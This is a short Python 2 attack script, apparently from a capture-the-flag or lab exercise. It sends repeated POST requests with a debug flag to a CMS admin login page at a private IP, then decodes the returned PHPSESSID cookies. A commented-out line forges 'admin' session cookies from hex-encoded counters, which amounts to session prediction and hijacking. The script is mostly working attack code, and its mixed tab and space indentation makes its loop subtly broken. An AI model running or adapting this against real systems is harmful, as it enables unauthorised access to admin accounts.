#!/usr/bin/python

__author__ = "bt3"

import requests

def brute_force_password(URL, PAYLOAD, MAXID):

    for i in range(MAXID):
        #HEADER ={'Cookie':'PHPSESSID=' + (str(i) + '-admin').encode('hex')}
        r = requests.post(URL, params=PAYLOAD)

	print(i)
	print r.text
	id_hex = requests.utils.dict_from_cookiejar(r.cookies)['PHPSESSID']
	print(id_hex.decode('hex'))




if __name__ == '__main__':

    #AUTH = ('admin', 'password')
    URL = 'http://10.13.37.12/cms/admin/login.php'

    PAYLOAD = ({'debug': '1', 'username': 'admin', 'password': 'pass'})
    MAXID = 640

    brute_force_password(URL, PAYLOAD, MAXID)
















